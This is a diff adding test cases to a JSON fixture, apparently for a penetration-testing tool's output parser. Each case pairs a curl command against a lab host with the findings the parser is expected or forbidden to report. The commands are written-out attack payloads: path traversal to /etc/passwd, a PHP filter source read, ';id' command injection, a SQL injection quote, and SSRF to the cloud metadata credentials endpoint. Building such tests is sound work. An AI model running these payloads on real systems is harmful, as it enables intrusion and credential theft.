@@ -610,6 +610,168 @@
         "access.admin",
         "access.system"
       ]
+    },
+    {
+      "id": "web_lfi_etc_passwd_read",
+      "tool": "curl",
+      "action_id": "lfi-probe",
+      "command": "curl -s \"http://10.10.10.10/index.php?page=../../../../etc/passwd\"",
+      "stdout": "outputs/web_lfi_etc_passwd_read.txt",
+      "expected_supported_kinds": [
+        "web.lfi_confirmed",
+        "loot.files"
+      ],
+      "expected_facts": [
+        {
+          "kind": "web.lfi_confirmed",
+          "scope": "host:10.10.10.10",
+          "value_contains": {"file": "/etc/passwd", "os": "linux", "method": "path_traversal"}
+        },
+        {
+          "kind": "loot.files",
+          "scope": "host:10.10.10.10",
+          "value_contains": {"files": ["/etc/passwd"], "via": "path_traversal"}
+        }
+      ],
+      "forbidden_supported_kinds": [
+        "credential.available",
+        "credential.plaintext",
+        "credential.candidate"
+      ]
+    },
+    {
+      "id": "web_lfi_php_filter_source",
+      "tool": "curl",
+      "action_id": "lfi-probe",
+      "command": "curl -s \"http://10.10.10.10/index.php?page=php://filter/convert.base64-encode/resource=db\"",
+      "stdout": "outputs/web_lfi_php_filter_source.txt",
+      "expected_supported_kinds": [
+        "web.lfi_confirmed",
+        "web.source",
+        "loot.files"
+      ],
+      "expected_facts": [
+        {
+          "kind": "web.lfi_confirmed",
+          "scope": "host:10.10.10.10",
+          "value_contains": {"method": "php_filter", "kind": "php_source"}
+        },
+        {
+          "kind": "web.source",
+          "scope": "host:10.10.10.10",
+          "value_contains": {"kind": "php"}
+        }
+      ],
+      "forbidden_supported_kinds": [
+        "credential.available",
+        "credential.plaintext"
+      ]
+    },
+    {
+      "id": "web_cmdi_uid_command_output",
+      "tool": "curl",
+      "action_id": "command-injection",
+      "command": "curl -s \"http://10.10.10.10/ping.php?ip=127.0.0.1;id\"",
+      "stdout": "outputs/web_cmdi_uid_output.txt",
+      "expected_supported_kinds": [
+        "web.cmdi_confirmed",
+        "host.os_hint"
+      ],
+      "expected_facts": [
+        {
+          "kind": "web.cmdi_confirmed",
+          "scope": "host:10.10.10.10",
+          "value_contains": {"os": "linux", "method": "os_command_injection"}
+        }
+      ],
+      "forbidden_supported_kinds": [
+        "credential.available",
+        "web.upload_confirmed"
+      ]
+    },
+    {
+      "id": "web_sqli_manual_error_signature",
+      "tool": "curl",
+      "action_id": "sqli-basics",
+      "command": "curl -s \"http://10.10.10.10/page.php?id=1%27\"",
+      "stdout": "outputs/web_sqli_error_signature.txt",
+      "expected_supported_kinds": [
+        "web.sqli_confirmed"
+      ],
+      "expected_facts": [
+        {
+          "kind": "web.sqli_confirmed",
+          "scope": "host:10.10.10.10",
+          "value_contains": {"tool": "manual", "method": "error_based", "dbms": "MariaDB"}
+        }
+      ],
+      "forbidden_supported_kinds": [
+        "db.creds",
+        "db.databases",
+        "foothold.webshell",
+        "credential.available"
+      ]
+    },
+    {
+      "id": "web_ssrf_imds_cloud_credentials",
+      "tool": "curl",
+      "action_id": "ssrf",
+      "command": "curl -s \"http://10.10.10.10/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/web-role\"",
+      "stdout": "outputs/web_ssrf_imds_aws_creds.txt",
+      "expected_supported_kinds": [
+        "web.ssrf_confirmed",
+        "credential.candidate"
+      ],
+      "expected_facts": [
+        {
+          "kind": "web.ssrf_confirmed",
+          "scope": "host:10.10.10.10",
+          "value_contains": {"method": "ssrf", "target": "cloud_metadata"}
+        },
+        {
+          "kind": "credential.candidate",
+          "scope": "host:10.10.10.10",
+          "value_contains": {"kind": "aws_sts_credentials", "access_key_id": "ASIAEXAMPLE123456789"}
+        }
+      ],
+      "forbidden_supported_kinds": [
+        "credential.available",
+        "cloud.aws_access",
+        "access.admin"
+      ]
+    },
+    {
+      "id": "web_sqli_benign_page_no_error",
+      "tool": "curl",
+      "action_id": "sqli-basics",
+      "command": "curl -s \"http://10.10.10.10/page.php?id=1%27\"",
+      "stdout": "outputs/web_sqli_benign_no_error.txt",
+      "forbidden_supported_kinds": [
+        "web.sqli_confirmed",
+        "db.creds"
+      ]
+    },
+    {
+      "id": "web_cmdi_reflected_input_no_execution",
+      "tool": "curl",
+      "action_id": "command-injection",
+      "command": "curl -s \"http://10.10.10.10/search.php?q=127.0.0.1;id\"",
+      "stdout": "outputs/web_cmdi_reflected_no_exec.txt",
+      "forbidden_supported_kinds": [
+        "web.cmdi_confirmed",
+        "web.upload_confirmed"
+      ]
+    },
+    {
+      "id": "web_lfi_documentation_mention_only",
+      "tool": "curl",
+      "action_id": "lfi-probe",
+      "command": "curl -s \"http://10.10.10.10/help.php?page=security\"",
+      "stdout": "outputs/web_lfi_mentions_passwd_doc.txt",
+      "forbidden_supported_kinds": [
+        "web.lfi_confirmed",
+        "loot.files"
+      ]
     }
   ]
 }
